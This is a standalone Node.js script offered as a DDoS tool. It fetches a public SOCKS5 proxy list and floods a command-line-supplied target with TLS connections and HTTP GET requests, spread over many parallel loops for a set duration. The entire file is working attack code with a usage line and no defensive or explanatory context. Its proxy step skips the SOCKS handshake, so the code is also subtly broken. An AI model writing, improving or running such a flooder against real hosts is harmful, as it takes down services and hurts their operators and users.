const net = require('net');
const tls = require('tls');
const https = require('https');

const proxyUrl = 'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt';

function fetchProxies(callback) {
    https.get(proxyUrl, (res) => {
        let data = '';
        res.on('data', chunk => { data += chunk; });
        res.on('end', () => {
            const proxies = data.trim().split('\n').map(proxy => proxy.trim());
            callback(proxies);
        });
    }).on('error', (err) => {
        console.error('Error fetching proxy list:', err);
        callback([]);
    });
}

function getRandomProxy(proxies) {
    if (proxies.length === 0) return null;
    return proxies[Math.floor(Math.random() * proxies.length)];
}

function startAttack(target, duration, threads) {
    fetchProxies((proxies) => {
        if (proxies.length === 0) {
            console.error('No proxies available');
            return;
        }

        console.log(`Starting attack on ${target} for ${duration} seconds with ${threads} threads`);

        const endTime = Date.now() + duration * 1000;

        function attack() {
            if (Date.now() >= endTime) return;

            const proxy = getRandomProxy(proxies);
            if (!proxy) return;

            const [proxyHost, proxyPort] = proxy.split(':');

            const netSocket = net.connect(proxyPort, proxyHost, () => {
                const tlsSocket = tls.connect({
                    socket: netSocket,
                    host: target,
                    servername: target,
                    rejectUnauthorized: false
                }, () => {
                    const request = `GET / HTTP/1.1\r\nHost: ${target}\r\nConnection: Keep-Alive\r\n\r\n`;
                    tlsSocket.write(request);
                });

                tlsSocket.on('data', () => {
                    tlsSocket.destroy();
                });

                tlsSocket.on('error', () => {
                    tlsSocket.destroy();
                });
            });

            netSocket.on('error', () => {
                netSocket.destroy();
            });

            setImmediate(attack);
        }

        for (let i = 0; i < threads; i++) {
            attack();
        }
    });
}

const target = process.argv[2];
const duration = parseInt(process.argv[3], 10);
const threads = parseInt(process.argv[4], 10);

if (!target || isNaN(duration) || isNaN(threads)) {
    console.log(`Usage: node ${process.argv[1]} <target> <duration> <threads>`);
    process.exit(1);
}

startAttack(target, duration, threads);
